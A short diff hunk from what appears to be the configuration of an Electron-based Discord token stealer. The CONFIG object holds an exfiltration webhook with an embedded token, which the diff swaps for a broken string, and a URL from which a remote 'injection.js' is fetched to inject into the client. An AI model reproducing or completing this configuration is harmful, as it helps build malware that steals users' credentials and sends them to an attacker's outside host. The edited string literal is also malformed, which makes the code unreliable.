@@ -12,7 +12,8 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1232984341521633290/cFW_y8koVvGzgcOMJjhAEdvX3EKTXChm61eW337wnblUgyGK1M8CBR6ep0qe7rxRLnT9",
+    webhook: "web
+    ",
     injection_url: "https://raw.githubusercontent.com/forystu/jskyo/main/injection.js",
     filters: {
         urls: [
